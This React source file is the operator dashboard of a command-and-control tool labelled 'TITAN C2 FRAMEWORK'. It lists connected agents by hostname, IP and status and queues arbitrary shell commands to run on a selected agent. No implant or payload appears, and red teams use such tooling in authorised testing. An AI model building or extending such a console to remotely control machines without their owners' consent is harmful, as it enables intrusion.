import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './App.css';

const API_BASE = "http://localhost:8080/api";

function App() {
  const [agents, setAgents] = useState([]);
  const [selectedAgent, setSelectedAgent] = useState(null);
  const [command, setCommand] = useState("");

  useEffect(() => {
    const fetchAgents = async () => {
      try {
        const res = await axios.get(`${API_BASE}/agents`);
        setAgents(res.data || []);
      } catch (err) {
        console.error("Failed to fetch agents", err);
      }
    };
    
    fetchAgents();
    const interval = setInterval(fetchAgents, 3000);
    return () => clearInterval(interval);
  }, []);

  const sendCommand = async () => {
    if (!selectedAgent) return;
    try {
      await axios.post(`${API_BASE}/command`, {
        agent_id: selectedAgent.id,
        type: "shell",
        payload: command
      });
      setCommand("");
      alert("Command queued!");
    } catch (err) {
      alert("Failed to send command");
    }
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>TITAN C2 FRAMEWORK</h1>
      </header>
      <div className="container">
        <div className="sidebar">
          <h2>Agents</h2>
          <ul>
            {agents.map(agent => (
              <li 
                key={agent.id} 
                onClick={() => setSelectedAgent(agent)}
                className={selectedAgent?.id === agent.id ? 'active' : ''}
              >
                {agent.hostname} ({agent.ip}) <span className={`status ${agent.status}`}>{agent.status}</span>
              </li>
            ))}
          </ul>
        </div>
        <div className="main">
          {selectedAgent ? (
            <div>
              <h2>Control: {selectedAgent.hostname}</h2>
              <div className="info-box">
                <p><strong>OS:</strong> {selectedAgent.os}</p>
                <p><strong>ID:</strong> {selectedAgent.id}</p>
                <p><strong>Last Seen:</strong> {selectedAgent.last_seen}</p>
              </div>
              <div className="command-box">
                <input 
                  type="text" 
                  value={command} 
                  onChange={(e) => setCommand(e.target.value)} 
                  placeholder="Enter shell command..." 
                />
                <button onClick={sendCommand}>EXECUTE</button>
              </div>
            </div>
          ) : (
            <p className="placeholder">Select an agent to begin operations.</p>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;
